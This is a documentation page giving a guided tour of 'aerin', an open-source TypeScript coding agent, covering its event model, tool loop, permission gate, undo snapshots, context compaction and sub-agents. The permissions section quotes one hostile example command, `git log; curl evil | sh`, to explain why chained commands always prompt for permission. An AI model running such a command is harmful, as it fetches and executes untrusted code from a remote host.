# How a coding agent works: a guided tour of aerin

Aerin is ~9,000 lines of TypeScript, and this page is the map. Read the eight stops in order — each is a few hundred words plus the source file — and you'll understand not just aerin, but how coding agents work in general: the loop, the safety model, the context economics, and the delegation patterns every serious agent (Claude Code, OpenCode, Hermes) implements in some form. Aerin's job is to be the version you can actually read.

**The reading path**: [events](#1-the-contract-srccoreeventsts) → [the loop](#2-the-loop-srccoreagentts) → [permissions](#3-the-gate-srcpermissionspolicyts) → [tools](#4-the-hands-srctools) → [undo](#5-the-safety-net-srccoreshadow-gitts) → [compaction](#6-the-context-economy-srccorecompactts) → [sub-agents](#7-delegation-srctoolsagent-toolts) → [assembly](#8-the-assembly-srcclits).

## 1. The contract — `src/core/events.ts`

Start with the smallest file, because it *is* the architecture. Everything the agent does — streamed text, reasoning, tool calls and results, permission asks, compaction, goal verdicts, failovers — is one union type: `AgentEvent`. The core emits an `AsyncIterable<AgentEvent>`; a frontend consumes it. That single seam is why aerin has three frontends (fullscreen TUI, plain REPL, headless print) with zero duplicated logic, and why the entire agent is testable without a terminal: tests just collect events from the iterator. The layering rule is absolute and enforced by convention: nothing in `core/`, `tools/`, `providers/`, `permissions/`, `config/`, `session/`, or `mcp/` may import Ink or React.

## 2. The loop — `src/core/agent.ts`

`Agent.send()` is the heart: an async generator that runs up to 50 tool-iterations per turn. Each iteration streams one model response (via the AI SDK's `streamText`); text is yielded live, tool calls are collected, and when the model stops calling tools the turn is over — unless something keeps it alive: a mid-turn user message (`inject()`), a `/goal` loop verdict (an LLM judge decides "not done yet" and pushes a steering message — see [goal-loop](goal-loop.md)), or a `turn:end` hook that rejects the turn. Around the model call sits the reliability layer: whole-request retries with backoff for transient errors, and a provider [failover chain](provider-failover.md) for rate limits and spent quotas. Around each tool call sits everything in stops 3–5. Two details worth studying: tools are declared *schema-only* to the model (no execute functions), so the permission gate can never be bypassed; and `dispatchToolCall` is where the doom-loop breaker, deferred-tool translation, hooks, and checkpointing all interpose, in a deliberate order.

## 3. The gate — `src/permissions/policy.ts`

The permission model is ~150 lines, on purpose: three tiers (read always allowed; write and execute ask), three modes (manual/accept/plan), prefix-glob allow rules like `bash(git *)`, and deny rules that beat everything including `--yolo`. Study the two adversarial details: chained bash commands (`;`, `&&`, backticks) always ask even under an allow rule — `git log; curl evil | sh` matches `bash(git *)` but is a different action — and deny rules are matched against every *segment* of a chained command. This file is deliberately NOT a policy language; the comment at the top explains why. [Full doc](permissions.md).

## 4. The hands — `src/tools/`

Every tool implements one small interface (`ToolDef` in `tools/types.ts`): name, description, flat zod schema, permission tier, `summarize` for prompts, optional `preview` (diffs in permission dialogs), and `execute`. Read `fs-tools.ts` for the exact-match edit discipline (CRLF-normalized, because Windows is first-class here), `bash.ts` for the Git Bash → PowerShell strategy, and `types.ts` for the shared truncation layer that [spills full output to disk](spill-files.md) instead of losing it. MCP servers' tools get wrapped into the same interface (`src/mcp/manager.ts`) — and when their schemas would eat >10% of the context window, they hide behind three [bridge tools](deferred-mcp-tools.md).

## 5. The safety net — `src/core/shadow-git.ts`

How do you undo what a bash command did? You can't intercept it — so aerin snapshots the whole work tree in a *shadow git repository* (its own `--git-dir`, your cwd as `--work-tree`, never touching your `.git`) before the first state-changing tool of each turn. `/undo` diffs the last snapshot against the current tree and restores exactly the changed files; `/redo` walks forward. ~200 lines, `.gitignore`-respecting (secrets never enter the shadow store), lazy (read-only turns cost nothing). [Full doc](undo-redo.md).

## 6. The context economy — `src/core/compact.ts`

Context is the scarce resource, and this file is the budget office. At 80% of the window, compaction fires in four phases: slim the old messages (elide bulky tool outputs), pick a token-budgeted protected tail that never splits a tool-call/result pair, produce a structured summary (Goal / Decisions / Done / In progress / Next), and — the key idea — on later compactions *update* the existing summary rather than re-summarizing it, so long sessions don't decay into a copy of a copy. Cheap per-request hygiene lives separately (`pruneOldToolResults` in agent.ts). [Full doc](compaction.md).

## 7. Delegation — `src/tools/agent-tool.ts`

Sub-agents are just more `Agent` instances with different options — that's the payoff of stop 2's design. Research agents get read-only tools and their own context window; only the final report returns, so a broad exploration costs the parent conversation nothing. Workers (`mode:"worker"`) add write/edit/bash under the *parent's* policy instance, with permission asks serialized through one dialog and their writes landing in the parent's undo snapshot. Recursion is structurally impossible: sub-agents never get the agent tool. [Full doc](subagents.md).

## 8. The assembly — `src/cli.ts`

`setupAgent()` wires it all: config loading (global ← project), model resolution (with the never-auto-pick-a-paid-model rule and Ollama fallback), MCP startup, skills/commands/named-agent discovery, system prompt construction (per-model-family tuning in `core/system-prompt.ts`), session store, hooks, diagnostics detection — then constructs the one `Agent` and hands it to whichever frontend you launched. Read this file last and everything clicks into place.

## Things you could build

The [good first issues](https://github.com/Serhii-Leniv/aerin/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) are scoped against this tour — each names the file, function, and test pattern to follow. The [docs index](index.md) has a page per feature with the invariants that must hold. And [CONTRIBUTING.md](../CONTRIBUTING.md) explains the two constraints that keep this codebase readable: the line budget and the no-new-deps rule.
